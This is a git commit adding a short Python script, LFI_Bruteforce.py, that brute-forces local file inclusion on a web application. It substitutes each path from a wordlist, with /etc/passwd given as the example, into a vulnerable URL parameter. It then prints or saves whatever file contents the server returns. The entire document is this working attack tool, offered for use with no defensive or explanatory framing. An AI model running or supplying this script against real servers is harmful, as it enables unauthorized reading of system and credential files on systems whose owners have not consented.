2c8da7152466856cc600ae0497ae7373491b16c8
Vouillamoz_Hugo <73638403+VouillamozHugo@users.noreply.github.com>
2023-02-28 03:49:08 -0800

    Add the python script to git

---
+++ LFI_Bruteforce.py
@@ -0,0 +1,29 @@
+from argparse import ArgumentParser
+import requests
+from urllib.request import urlopen
+
+def exploit_LFI():
+    url = args.url
+    f = open(args.list)
+    for line in f.readlines():
+        url_var = url.replace('LFI', line)
+        page = urlopen(url_var)
+        content = page.read()
+        if len(content) > 0:
+            if args.dest == None:
+                print("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
+            else:
+                with open(args.dest, 'a') as f:
+                    f.write("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
+                    f.close()
+
+if __name__ == '__main__':
+    p = ArgumentParser()
+    p.add_argument('-w', '--wordlist', dest='list',
+                   help='Wordlist containing files to test with LFI (example: /etc/passwd)', required=True)
+    p.add_argument('-u', '--url', dest='url', help='The path to the LFI exploit example: http://localhost?file=LFI',
+                   required=True)
+    p.add_argument('-o', '--outfile', dest='dest', help='Output file to write all informations found', required=False)
+    args = p.parse_args()
+
+    exploit_LFI()
